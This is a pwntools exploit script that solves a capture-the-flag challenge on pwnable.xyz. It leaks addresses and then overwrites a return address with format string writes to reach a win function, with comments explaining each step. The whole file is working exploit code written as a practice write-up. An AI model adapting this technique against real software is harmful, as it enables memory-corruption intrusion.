from pwn import *
from struct import *


debug = 0
if not debug:
    sh = remote('svc.pwnable.xyz', 30010)
else:
    sh = process('./challenge')



#there is a format string vulnerability 
# in assembly code we notice a printf(cmd + 0x20) in which address we can write whatever we want like %x etc
# unfortunately we can write only 6 bytes and we want to extend this in order to change succesfully return address
'''
FIND CMD ADDRESS
========================================================================
'''

name = "A"*25
name += "%2$xaa"
sh.sendlineafter(': ', name) 
sh.sendlineafter('> ', '2')
cmd = int(sh.recvline()[0:8], 16)
log.info('cmd = 0x{:x}'.format(cmd))

'''
========================================================================
'''


'''
FIND STACK ADDRESS WHERE RETURN ADDRESS WILL BE
========================================================================
'''

name1 = "A"*25
name1 += "%10$xa"
sh.sendlineafter('> ', '1')
sh.sendlineafter(': ', name1) 
sh.sendlineafter('> ', '2')
stack = int(sh.recvline()[0:8], 16) - 0xc
log.info('stack = 0x{:x}'.format(stack))
'''
========================================================================
'''

'''
FIND WIN ADDRESS
========================================================================
'''


sh.sendlineafter('> ', '1')
name2 = "A"*25
name2 += "%11$p"
sh.sendafter(': ', name2)
sh.sendlineafter('> ', '2')
ret = int(sh.recvline()[0:10], 16)
log.info('ret = 0x{:x}'.format(ret))
win_addr = ret - 0x7a
log.info('win = 0x{:x}'.format(win_addr))

'''
========================================================================
'''


dig = win_addr % (16**4)
log.info('sooo win last 4 digits are = 0x{:x}'.format(dig))


'''
Fill 0's in cmd + 0x20 with 1 to move further null string termination
and make cmd + 0x30 (name) part of the printf vulnerability
so as to make room for the format string attack (change return address)
========================================================================
'''


name2 = "A"*25
name2 += "A%6$nA"
sh.sendlineafter('> ', '1')
sh.sendafter(': ', name2)
# here we have to be careful 
# we know we have to run option '2' but our input couldn't be '2' because 
# %6$n would search for address 0x2  to write and we would get segfault
# instead we use a writeable address with an ending: 0x02
# in assembly we notice after scanf program takes only al (last byte of register)  
pseudo_cmd = str(cmd + 0x92) 
sh.sendlineafter('> ', pseudo_cmd)

for i in range(11):
    sh.sendlineafter('> ', str(cmd - 0xa + i))

'''
========================================================================
'''



win_high = win_addr / (16**4)
log.info('and win 4 most significant digits are: 0x{:x}'.format(win_high))

'''
carfting payload for format string attack
========================================================================
'''
name3 = "%"
name3 += str(dig - 12) #wtf 12 is magic number, output is "AA" and 10 other chars, 
                       #because A%6$nA takes 6 bytes (but ouputs only 2) and we have 10 more until we reach cmd + 0x30
name3 += "x%6$n"
name3 += '\x00' # be careful we want to null terminate the string because inside Name(in the end) 
                # there is an extra %6$n which will change again our return address

sh.sendlineafter('> ',str(cmd - 0x70 + 0x101))
sh.sendlineafter(': ', name3)
#gdb.attach(sh)
#pause()
sh.sendlineafter('> ', str(stack - 2**32))
sh.sendlineafter('> ', str(cmd - 0x70 + 0x101))
name4 = "%"
name4 += str(win_high - 12)
name4 += "x%6$n"
name4 += "a"*(31 - 6 - len(str(win_high))) # instead of null terminating the string we could just fill name with a bunch of a's 
sh.sendlineafter(': ', name4)
sh.sendlineafter('> ', str(stack - 2**32 + 0x2))
sh.sendlineafter('> ', '0')
sh.interactive()
'''
========================================================================
'''







